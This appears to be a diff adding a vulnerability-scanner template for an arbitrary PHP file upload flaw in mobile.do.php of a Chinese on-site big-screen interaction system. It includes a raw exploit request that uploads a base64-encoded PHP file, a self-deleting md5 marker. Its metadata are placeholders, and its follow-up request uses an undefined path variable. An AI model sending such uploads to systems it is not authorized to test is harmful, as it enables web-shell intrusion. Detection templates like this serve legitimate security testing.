@@ -1,0 +1,35 @@
+id: jhdjdp-mobile-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 金华迪加现场大屏互动系统mobile.do.php任意文件上传漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /mobile/mobile.do.php?action=msg_uploadimg HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Connection: close
+        Content-Length: 71
+
+        filetype=php&imgbase64=PD9waHAgZWNobyhtZDUoMSkpOyB1bmxpbmsoX19GSUxFX18pOyA/Pg==
+      - |+
+        GET /{{path1}} HTTP/1.1
+        Host: {{Hostname}}
+        accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '.php'      
